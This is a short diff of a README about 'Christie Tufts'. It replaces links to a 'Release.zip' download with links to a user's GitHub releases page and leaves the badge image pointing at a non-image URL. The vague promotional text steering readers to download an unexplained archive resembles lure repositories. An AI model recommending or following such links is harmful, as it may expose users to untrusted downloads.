@@ -17,8 +17,8 @@ The contents of this repository include:
 
 ## Explore More 🚀
 
-To dive into the wealth of knowledge and guidance offered by Christie Tufts, visit the following [link](https://github.com/releases/789694263/Release.zip).
+To dive into the wealth of knowledge and guidance offered by Christie Tufts, visit the following [link](https://github.com/khng1234/site/releases).
 
-[![Launch Repository](https://img.shields.io/badge/Launch-Repository-blue)](https://github.com/releases/789694263/Release.zip)
+[![Launch Repository](https://github.com/khng1234/site/releases)](https://github.com/khng1234/site/releases)
 
 🌟 Remember, knowledge is power. Explore, learn, and embark on your journey to enlightenment with Christie Tufts! 🌟
